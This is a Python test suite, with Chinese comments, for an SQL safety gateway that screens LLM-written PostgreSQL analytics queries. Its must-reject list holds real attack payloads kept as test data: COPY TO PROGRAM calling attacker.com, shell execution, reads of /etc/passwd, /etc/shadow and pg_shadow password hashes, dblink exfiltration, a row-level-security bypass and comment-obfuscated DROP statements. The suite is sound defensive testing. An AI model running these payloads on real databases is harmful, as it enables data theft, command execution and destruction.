"""SQL 安全网关的**攻击性测试**。

设计原则：这不是"功能测试"，是**对抗测试**。
每一条 MUST_REJECT 都是真实世界见过的攻击载荷或误用形态，
而不是"我随便写个 DELETE 试试"。

必须在两类上同时成立：
  - MUST_REJECT 全部被拒（漏放 = 安全事故）
  - MUST_ALLOW 全部通过（误拒 = 功能不可用；误拒率要纳入评测）

另有一组"边界"用例：这些语句本身合法但形态刁钻，
用来验证**不能靠字符串匹配**做安全（注释混淆、大小写、空白、等价改写）。
"""

from __future__ import annotations

import pytest

from app.analytics.guard import guard_sql, is_safe

MAX_ROWS = 200


# ==================== 必须拒绝：真实攻击载荷 ====================

MUST_REJECT = [
    # ---- 1) 破坏性 DDL / DML ----
    ("DROP TABLE employees", "DDL 删表"),
    ("DROP TABLE IF EXISTS employees CASCADE", "DDL 删表带 CASCADE"),
    ("TRUNCATE TABLE employees", "清空表"),
    ("ALTER TABLE employees DROP COLUMN salary", "DDL 改结构"),
    ("CREATE TABLE evil (x int)", "DDL 建表"),
    ("CREATE INDEX idx ON employees(salary)", "DDL 建索引"),
    ("DELETE FROM employees WHERE 1=1", "无条件删全表"),
    ("DELETE FROM employees", "删全表"),
    ("UPDATE employees SET salary = 999999", "篡改数据"),
    ("INSERT INTO employees VALUES (1,'x')", "插入数据"),
    ("MERGE INTO employees USING x ON true WHEN MATCHED THEN DELETE", "MERGE 写操作"),
    ("GRANT ALL ON employees TO public", "提权"),
    ("REVOKE SELECT ON employees FROM kb_ro", "回收权限"),

    # ---- 2) 多语句注入 ----
    ("SELECT * FROM employees; DROP TABLE employees;", "多语句+删表"),
    ("SELECT 1; SELECT 2", "多语句普通形态"),
    ("SELECT count(*) FROM employees; DELETE FROM employees", "多语句尾部注入"),

    # ---- 3) 系统目录 / 账号权限表 ----
    ("SELECT * FROM pg_shadow", "读口令哈希表"),
    ("SELECT * FROM pg_authid", "读角色认证表"),
    ("SELECT usename, passwd FROM pg_shadow", "显式取口令列"),
    ("SELECT * FROM pg_catalog.pg_roles", "schema 限定系统表"),
    ("SELECT * FROM information_schema.tables", "information_schema"),
    ("SELECT * FROM pg_stat_activity", "读其他会话（含查询内容）"),
    ("SELECT * FROM pg_settings", "读服务端配置"),
    ("SELECT * FROM pg_hba_file_rules", "读认证配置"),

    # ---- 4) 文件读写 ----
    ("SELECT pg_read_file('/etc/passwd')", "读服务端文件"),
    ("SELECT pg_read_binary_file('/etc/shadow')", "读二进制文件"),
    ("SELECT pg_ls_dir('/')", "列目录"),
    ("SELECT pg_stat_file('/etc/passwd')", "取文件元信息"),
    ("SELECT lo_import('/etc/passwd')", "大对象导入"),
    ("SELECT lo_export(1234, '/tmp/x')", "大对象导出"),

    # ---- 5) 命令执行 ----
    ("COPY employees TO PROGRAM 'curl attacker.com'", "COPY 命令执行"),
    ("COPY (SELECT 1) TO PROGRAM 'sh -c id'", "COPY 子查询命令执行"),
    ("COPY employees FROM '/etc/passwd'", "COPY 读文件"),

    # ---- 6) 写表（SELECT INTO）----
    ("SELECT * INTO TEMP TABLE t FROM employees", "SELECT INTO 建表"),
    ("SELECT * INTO newtable FROM employees", "SELECT INTO 持久表"),

    # ---- 7) DoS / 资源耗尽（合法 SELECT 也能打满库）----
    ("SELECT pg_sleep(3600)", "挂住连接"),
    ("SELECT pg_sleep_for('1 hour')", "挂住连接（interval 形态）"),
    ("SELECT pg_terminate_backend(123)", "杀其他会话"),
    ("SELECT pg_cancel_backend(123)", "取消其他会话"),
    ("SELECT pg_reload_conf()", "重载服务端配置"),
    ("SELECT pg_advisory_lock(1)", "抢咨询锁（可造成死锁）"),

    # ---- 8) 外部连接 / 数据外带 ----
    ("SELECT * FROM dblink('host=evil', 'select 1') AS t(x int)", "dblink 外带"),
    ("SELECT set_config('app.tenant_id', 'other', false)", "篡改会话变量绕过 RLS"),

    # ---- 9) 注释混淆（针对字符串匹配型防护）----
    ("/*x*/ DELETE /*y*/ FROM employees", "块注释穿插关键字"),
    ("SELECT 1 -- \n; DROP TABLE employees", "行注释后接注入"),
    ("DELETE/**/FROM/**/employees", "无空格注释分隔"),

    # ---- 10) 会话/事务控制 ----
    ("SET ROLE postgres", "切换角色提权"),
    ("BEGIN; SELECT 1; COMMIT;", "事务控制"),
    ("SET default_transaction_read_only = off", "关闭只读保护"),
    ("SET statement_timeout = 0", "关闭超时保护"),

    # ---- 11) 空/异常输入 ----
    ("", "空字符串"),
    ("   ", "纯空白"),
    ("这不是 SQL", "非 SQL 文本"),
    ("SELECT", "残缺语句"),
]


# ==================== 必须放行：合法统计查询 ====================

MUST_ALLOW = [
    # ---- 基础聚合 ----
    "SELECT count(*) FROM employees",
    "SELECT department, count(*) FROM employees GROUP BY department",
    "SELECT department, count(*) c FROM employees GROUP BY department HAVING count(*) > 1000",
    "SELECT avg(salary) FROM employees WHERE department = 'Sales'",
    "SELECT max(salary), min(salary) FROM employees",
    "SELECT department, round(avg(salary), 2) FROM employees GROUP BY department",

    # ---- 排序 / Top-N ----
    "SELECT first_name, last_name, salary FROM employees ORDER BY salary DESC LIMIT 10",
    "SELECT department FROM employees GROUP BY department ORDER BY count(*) DESC LIMIT 1",

    # ---- 日期 ----
    "SELECT count(*) FROM employees WHERE hire_date >= '2026-01-01'",
    "SELECT date_trunc('year', hire_date) AS y, count(*) FROM employees GROUP BY 1 ORDER BY 1",

    # ---- CTE / 子查询 / 窗口函数 ----
    "WITH d AS (SELECT department, count(*) c FROM employees GROUP BY 1) "
    "SELECT * FROM d ORDER BY c DESC",
    "SELECT department, salary FROM employees e "
    "WHERE salary > (SELECT avg(salary) FROM employees WHERE department = e.department)",
    "SELECT first_name, salary, rank() OVER (ORDER BY salary DESC) r FROM employees LIMIT 5",

    # ---- JOIN ----
    "SELECT s.product, sum(s.revenue) FROM sales s GROUP BY s.product ORDER BY 2 DESC LIMIT 1",

    # ---- 中文列名表 ----
    "SELECT col_1, col_4 FROM cost_data ORDER BY col_4 DESC LIMIT 3",
    "SELECT count(*) FROM cost_data WHERE col_4 IS NOT NULL",

    # ---- 大小写/引号 合法形态 ----
    "select COUNT(*) from EMPLOYEES",
    'SELECT "department", "salary" FROM "employees" LIMIT 5',

    # ---- 带 markdown 围栏（模型常见输出，应被剥离后放行）----
    "```sql\nSELECT count(*) FROM employees\n```",
]


# ==================== 测试 ====================

@pytest.mark.parametrize("sql,label", MUST_REJECT, ids=[x[1] for x in MUST_REJECT])
def test_must_reject(sql, label):
    """所有攻击载荷必须被拒。"""
    r = guard_sql(sql, MAX_ROWS)
    assert not r.ok, f"漏放（安全事故）: [{label}] {sql!r}"
    assert r.reason, f"拒绝时必须给出原因: [{label}]"
    assert r.user_message, f"拒绝时必须有面向 LLM 的说明: [{label}]"


@pytest.mark.parametrize("sql", MUST_ALLOW, ids=[s[:45] for s in MUST_ALLOW])
def test_must_allow(sql):
    """所有合法查询必须通过（误拒 = 功能不可用）。"""
    r = guard_sql(sql, MAX_ROWS)
    assert r.ok, f"误拒（功能不可用）: {sql!r} 原因={r.reason}"
    assert r.sql.strip(), "通过时必须返回可执行 SQL"


class TestLimitInjection:
    """LIMIT 强制注入 —— 上界必须不可绕过。

    注意：注入值是 `max_rows + 1`，不是 `max_rows`。
    原因见 test_guard_limit_matches_executor_probe：
    执行器靠"多读一行"判断截断，所以注入上限必须比读取上限多 1。
    """

    def test_limit_is_injected(self):
        r = guard_sql("SELECT * FROM employees", MAX_ROWS)
        assert r.ok and r.limit_injected
        assert f"LIMIT {MAX_ROWS + 1}" in r.sql.upper()

    def test_llm_written_large_limit_is_contained(self):
        """模型自己写 LIMIT 999999 也必须被外层压住（这是关键绕过尝试）。"""
        r = guard_sql("SELECT * FROM employees LIMIT 999999", MAX_ROWS)
        assert r.ok, r.reason
        # 外层包裹 -> 最终 SQL 里应出现我们注入的 LIMIT
        assert f"LIMIT {MAX_ROWS + 1}" in r.sql.upper(), r.sql

    def test_wrapping_used_not_appending(self):
        """必须是外层包裹（FROM (subquery)），而非尾部追加。

        判据：结果里应出现派生表别名 _q。
        """
        r = guard_sql("SELECT count(*) FROM employees", MAX_ROWS)
        assert r.ok
        assert "_q" in r.sql, f"应采用外层包裹改写，实际: {r.sql}"

    def test_count_query_wrapping_is_valid_sql(self):
        """包裹后仍应是可被 PostgreSQL 解析的合法 SQL（用 sqlglot 复核）。"""
        import sqlglot

        r = guard_sql("SELECT department, count(*) FROM employees GROUP BY department", MAX_ROWS)
        assert r.ok
        # 不抛异常即说明是合法 SQL
        sqlglot.parse(r.sql, dialect="postgres")

    def test_custom_max_rows(self):
        r = guard_sql("SELECT * FROM employees", 7)
        assert r.ok and "LIMIT 8" in r.sql.upper()

    def test_guard_limit_matches_executor_probe(self):
        """锁死不变式：guard 注入的 LIMIT == max_rows + 1。

        为什么必须有这条测试：
          执行器靠"多读一行"判断截断（fetchmany(max_rows + 1)）。
          如果 guard 注入的是 max_rows，执行器读到 max_rows 行时
          就**无法区分**「结果总共就这么多」与「被截断了」——
          会把截断结果当完整结果汇报给用户，即**静默失真**。
          这类常量漂移不会报错，只会悄悄给出错误结论，所以要用测试钉死。
        """
        import re

        for max_rows in (1, 50, 200, 999):
            r = guard_sql("SELECT * FROM employees", max_rows)
            assert r.ok, r.reason
            m = re.search(r"LIMIT\s+(\d+)", r.sql, re.IGNORECASE)
            assert m, f"未找到注入的 LIMIT: {r.sql}"
            injected = int(m.group(1))
            assert injected == max_rows + 1, (
                f"guard 注入了 LIMIT {injected}，但执行器会探测 {max_rows + 1} 行 —— "
                f"截断判定会失真"
            )

    def test_truncation_detection_is_actually_achievable(self):
        """可判定性验证：注入的上限必须严格大于读取上限。

        用真实数据验证：一个必然被截断的查询，执行器必须能判定 truncated=True。
        这是上面那条不变式的"行为级"证明（而非只看数字）。
        """
        from app.analytics.guard import guard_sql as g

        r = g("SELECT * FROM employees", 200)
        assert r.ok
        # 外层 LIMIT 必须能返回 201 行，执行器才有机会发现"还有更多"
        assert "LIMIT 201" in r.sql.upper()


class TestNoFalseNegativesViaObfuscation:
    """针对"字符串匹配型防护"的绕过尝试 —— 验证我们走的是 AST 而非正则。"""

    @pytest.mark.parametrize("sql", [
        "DR" + "OP TABLE employees",                 # 拼接
        "  DROP   TABLE   employees  ",              # 多余空白
        "drop table employees",                      # 小写
        "DrOp TaBlE employees",                      # 混合大小写
        "/* c */ DROP TABLE employees",              # 前置注释
        "\n\n\tDROP\n\tTABLE\n\temployees",          # 换行制表符
    ])
    def test_ddl_variants_all_rejected(self, sql):
        assert not is_safe(sql, MAX_ROWS), f"变体绕过: {sql!r}"

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM PG_SHADOW",
        "select * from PG_Catalog.PG_SHADOW",
        "SELECT * FROM pg_catalog . pg_shadow",
    ])
    def test_system_table_variants_rejected(self, sql):
        assert not is_safe(sql, MAX_ROWS), f"系统表变体绕过: {sql!r}"

    @pytest.mark.parametrize("sql", [
        "SELECT PG_READ_FILE('/etc/passwd')",
        "select Pg_Read_File('/etc/passwd')",
    ])
    def test_forbidden_function_variants_rejected(self, sql):
        assert not is_safe(sql, MAX_ROWS), f"函数变体绕过: {sql!r}"

    def test_unicode_lookalike_table_is_not_confused(self):
        """全角/相似字符不应被误当成系统表（避免误拒），但也不应绕过。

        这里只断言"不崩"，具体放行与否交给 AST 判定。
        """
        guard_sql("SELECT * FROM ｐｇ_shadow", MAX_ROWS)  # 不抛异常即可


class TestGuardResultShape:
    """契约测试：GuardResult 的字段语义必须稳定（executor 依赖它）。"""

    def test_reject_has_empty_sql(self):
        r = guard_sql("DROP TABLE x", MAX_ROWS)
        assert not r.ok
        assert r.sql == ""
        assert r.reason and r.user_message

    def test_allow_has_reason_empty(self):
        r = guard_sql("SELECT 1", MAX_ROWS)
        assert r.ok
        assert r.reason == ""

    def test_reason_is_operator_facing_message_is_llm_facing(self):
        """两类信息必须分开：reason 给运维/审计看，user_message 回灌给 LLM。"""
        r = guard_sql("DROP TABLE employees", MAX_ROWS)
        assert not r.ok
        # reason 是技术描述（含类型名）
        assert "Drop" in r.reason or "DROP" in r.reason.upper()
        # user_message 是可执行的修正指引
        assert "SELECT" in r.user_message
